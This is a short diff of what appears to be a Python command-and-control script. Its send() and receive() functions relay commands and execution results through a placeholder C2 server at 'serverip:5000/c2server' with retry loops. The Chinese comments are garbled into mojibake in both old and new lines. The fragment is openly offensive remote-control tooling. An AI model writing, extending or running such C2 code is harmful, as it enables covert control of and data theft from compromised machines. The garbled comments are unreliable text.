@@ -8,15 +8,15 @@ import threading
 import base64
 
 
-#serverip»»³Éc2·şÎñÆ÷ip
+#serveripæ¢æˆc2æœåŠ¡å™¨ip
 
 def send(c2cmd):
 	url="http://serverip:5000/c2server?cmd="+c2cmd
 	#print url
-	# ·¢ËÍÃüÁî
+	# å‘é€å‘½ä»¤
 	i=1
 	try:
-		while i<20:
+		while i<10:
 			i=i+1
 			s1= requests.get(url, timeout=10)
 			#print s1.status_code
@@ -34,7 +34,7 @@ def receive():
 	url="http://serverip:5000/c2server?results=test"
 	#data = {"text": "base64.b64encode(str(r1))"}
 	#print url
-	# ÃüÁîÖ´ĞĞ½áÊøµÄ»ØÏÔ·¢ËÍ
+	# å‘½ä»¤æ‰§è¡Œç»“æŸçš„å›æ˜¾å‘é€
 	i=1
 	try:
 		while i<10:
